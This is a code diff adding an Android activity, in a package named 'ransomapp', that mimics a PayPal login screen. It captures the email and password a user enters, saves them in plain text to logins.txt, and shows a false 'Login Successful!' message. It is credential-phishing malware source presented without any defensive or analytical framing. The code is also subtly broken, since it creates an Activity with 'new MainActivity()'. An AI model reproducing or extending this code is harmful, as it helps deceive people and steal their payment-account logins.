@@ -1,0 +1,37 @@
+package com.example.ransomapp;
+
+import android.app.Activity;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.Toast;
+
+public class PayPalLoginActivity extends Activity {
+    EditText emailField, passwordField;
+    Button loginButton;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_paypal_login); // You need to create this layout
+
+        emailField = findViewById(R.id.paypal_email);
+        passwordField = findViewById(R.id.paypal_password);
+        loginButton = findViewById(R.id.paypal_login_button);
+
+        loginButton.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                String email = emailField.getText().toString();
+                String password = passwordField.getText().toString();
+                // Save credentials
+                MainActivity main = new MainActivity();
+                main.writeToFile("logins.txt", "PayPal: " + email + " / " + password + "\n");
+                Toast.makeText(PayPalLoginActivity.this, "Login Successful!", Toast.LENGTH_SHORT).show();
+                // Close or go back to main
+                finish();
+            }
+        });
+    }
+}
